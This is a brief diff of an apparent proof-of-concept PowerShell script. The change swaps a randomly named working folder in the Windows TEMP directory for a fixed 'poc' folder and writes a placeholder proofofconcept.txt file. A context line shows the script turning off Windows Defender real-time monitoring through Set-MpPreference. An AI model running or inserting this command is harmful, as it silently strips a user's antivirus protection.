@@ -12,11 +12,12 @@ powershell -command 'Set-MpPreference -DisableRealtimeMonitoring $true -DisableS
 # goto temp & make working directory
 $wd = random_text
 $path = "$env:TEMP/$wd"
+$pocpath = "$env:TEMP/poc"
 echo $path
 
 
-mkdir $path
-cd $path
+mkdir $pocpath
+cd $pocpath
 echo "" > proofofconcept. txt
 cd "C:\Users\dylan\Documents\Personal Projects\Quention\files"
 pause
